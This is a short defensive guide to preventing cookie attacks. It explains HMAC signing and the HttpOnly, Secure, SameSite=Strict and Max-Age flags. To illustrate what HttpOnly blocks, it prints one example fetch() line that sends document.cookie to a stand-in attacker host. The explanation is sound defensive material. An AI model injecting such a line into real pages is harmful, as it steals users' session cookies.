# Cookie attack prevention

### 1. Server-side encryption / signing

Use a strong hasing algorithm in combination with a server-side key for signing cookies - like HMAC-SHA256.

### 2. Restricting flags

```http
Set-Cookie: session=<token>;
  HttpOnly;
  Secure;
  SameSite=Strict;
  Max-Age=3600
```

#### 2.1 HttpOnly

It hides cookie's values to JavaScript. Meaning that it will not show with document.cookie, making the attacker unable to see and send it to a malicious site through url param.

```fetch('https://evil.com/steal?c=' + document.cookie)```

#### 2.2 Secure

Cookie cannot travel over an unencrypted channel, only over HTTPS connection. So, even if a user ends up on an HTTP version of the site before being redirected, a man-in-the-middle attack will be unable to see Secure cookies by packet sniffing.

#### 2.3 SameSite=Strict

SameSite=Strict ensures a cookie is only sent when the request originates from the same site it was set on. This is the primary defense against CSRF (Cross-Site Request Forgery): if evil.com triggers a request to good.com while the user has an active session there, the browser will withhold good.com's cookie — because the request originated from a different site — so the request arrives unauthenticated and the attack fails.

#### 2.4 Max-Age

Max-Age controls how long the cookie stays valid before the browser automatically deletes it — it sets the cookie's lifetime, in seconds, from the moment it's received.
